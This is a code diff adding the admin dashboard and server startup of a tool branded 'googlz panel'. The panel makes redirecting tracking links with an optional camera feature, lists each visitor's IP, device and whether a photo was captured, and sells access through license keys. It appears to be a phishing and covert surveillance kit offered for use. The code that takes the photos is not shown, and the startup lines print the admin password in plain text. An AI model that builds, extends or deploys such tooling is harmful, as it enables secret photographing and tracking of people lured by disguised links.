+  if (!confirm('Clear all completed captures?')) return;
+  fetch('/admin-clear-completed', {
+    method: 'POST', headers: {'Content-Type':'application/json'}
+  }).then(r => r.json()).then(d => {
+    if (d.success) showToast('Completed captures cleared', 'success');
+    setTimeout(() => location.reload(), 1000);
+  });
+}
+
+function clearAll() {
+  if (!confirm('⚠️ This will delete ALL data! Are you sure?')) return;
+  fetch('/admin-clear-all', {
+    method: 'POST', headers: {'Content-Type':'application/json'}
+  }).then(r => r.json()).then(d => {
+    if (d.success) showToast('All data cleared', 'success');
+    setTimeout(() => location.reload(), 1500);
+  });
+}
+
+// ─── LINK ACTIONS ───
+
+function createLink() {
+  const name = document.getElementById('link-name').value.trim();
+  const redirectUrl = document.getElementById('link-redirect').value.trim();
+  const notes = document.getElementById('link-notes').value.trim();
+  const camera = document.getElementById('link-camera').checked;
+
+  if (!name || !redirectUrl) {
+    showToast('Name and Redirect URL are required', 'error');
+    return;
+  }
+
+  fetch('/' + ADMIN_PATH + '/links/create', {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({name, redirectUrl, notes, camera})
+  }).then(r => r.json()).then(d => {
+    if (d.success) {
+      showToast('Link created! URL: ' + d.trackingUrl, 'success');
+      closeModal('create-link');
+      setTimeout(() => location.reload(), 1500);
+    } else {
+      showToast(d.error || 'Failed to create link', 'error');
+    }
+  });
+}
+
+function deleteLink(linkId) {
+  if (!confirm('Delete this tracking link and all its visits?')) return;
+  fetch('/' + ADMIN_PATH + '/links/delete', {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({linkId})
+  }).then(r => r.json()).then(d => {
+    if (d.success) showToast('Link deleted', 'success');
+    else showToast('Failed', 'error');
+    setTimeout(() => location.reload(), 1000);
+  });
+}
+
+function viewVisits(linkId, linkName) {
+  fetch('/' + ADMIN_PATH + '/links/' + linkId + '/visits')
+    .then(r => r.json())
+    .then(d => {
+      if (!d.success) { showToast('Failed to load visits', 'error'); return; }
+      document.getElementById('visits-modal-title').textContent = 'Visits: ' + linkName;
+      document.getElementById('visits-modal-sub').textContent = d.visits.length + ' visit(s) recorded';
+      const list = document.getElementById('visits-list');
+      if (d.visits.length === 0) {
+        list.innerHTML = '<div class="empty-state">No visits yet</div>';
+      } else {
+        list.innerHTML = d.visits.map(v => {
+          const cameraBadge = v.cameraCaptured
+            ? '<span style="color:#81c995;font-size:10px">📷 Photo</span>'
+            : '';
+          return `<div class="visit-item">
+            <span class="visit-ip">${v.ip}</span>
+            <span class="visit-device">${v.device.browser} · ${v.device.os}${v.device.isMobile ? ' · Mobile' : ''}</span>
+            ${cameraBadge}
+            <span class="visit-time">${new Date(v.timestamp).toLocaleString()}</span>
+          </div>`;
+        }).join('');
+      }
+      openModal('visits');
+    });
+}
+
+// ─── LICENSE ACTIONS ───
+
+function createLicense() {
+  const duration = document.getElementById('license-duration').value;
+  const maxUses = parseInt(document.getElementById('license-max-uses').value) || 0;
+  const note = document.getElementById('license-note').value.trim();
+
+  fetch('/' + ADMIN_PATH + '/licenses/create', {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({duration, maxUses, note})
+  }).then(r => r.json()).then(d => {
+    if (d.success) {
+      document.getElementById('generated-key').textContent = d.license.key;
+      closeModal('create-license');
+      openModal('license-result');
+    } else {
+      showToast(d.error || 'Failed to generate license', 'error');
+    }
+  });
+}
+
+function revokeLicense(key) {
+  if (!confirm('Revoke license key ' + key + '?')) return;
+  fetch('/' + ADMIN_PATH + '/licenses/revoke', {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({key})
+  }).then(r => r.json()).then(d => {
+    if (d.success) showToast('License revoked', 'success');
+    else showToast('Failed', 'error');
+    setTimeout(() => location.reload(), 1000);
+  });
+}
+
+// ─── USER ACTIONS ───
+
+function createUser() {
+  const username = document.getElementById('user-username').value.trim();
+  const password = document.getElementById('user-password').value.trim();
+  const role = document.getElementById('user-role').value;
+
+  if (!username || !password) {
+    showToast('Username and password are required', 'error');
+    return;
+  }
+
+  fetch('/' + ADMIN_PATH + '/users/create', {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({username, password, role})
+  }).then(r => r.json()).then(d => {
+    if (d.success) {
+      showToast('User created: ' + d.user, 'success');
+      closeModal('create-user');
+      setTimeout(() => location.reload(), 1500);
+    } else {
+      showToast(d.error || 'Failed to create user', 'error');
+    }
+  });
+}
+
+function deleteUser(username) {
+  if (!confirm('Delete user ' + username + '?')) return;
+  fetch('/' + ADMIN_PATH + '/users/delete', {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({username})
+  }).then(r => r.json()).then(d => {
+    if (d.success) showToast('User deleted', 'success');
+    else showToast('Failed', 'error');
+    setTimeout(() => location.reload(), 1000);
+  });
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+  // Auto-refresh active sessions every 10 seconds
+  setInterval(function() {
+    fetch('/${ADMIN_PATH}/sessions/count')
+      .then(r => r.json())
+      .then(d => {
+        // Update badge counts if needed
+      })
+      .catch(() => {});
+  }, 10000);
+});
+</script>
+
+<div class="footer-text">googlz panel v2.0 · All traffic logged</div>
+</body></html>`);
+}
+
+// ═══════════════════════════════════════════════
+//  START SERVER
+// ═══════════════════════════════════════════════
+
+app.listen(PORT, () => {
+  console.log(`[googlz] Server running on port ${PORT}`);
+  console.log(`[googlz] Admin panel: http://localhost:${PORT}/${ADMIN_PATH}`);
+  console.log(`[googlz] Admin login: ${ADMIN_USERNAME} / ${ADMIN_PASSWORD}`);
+});
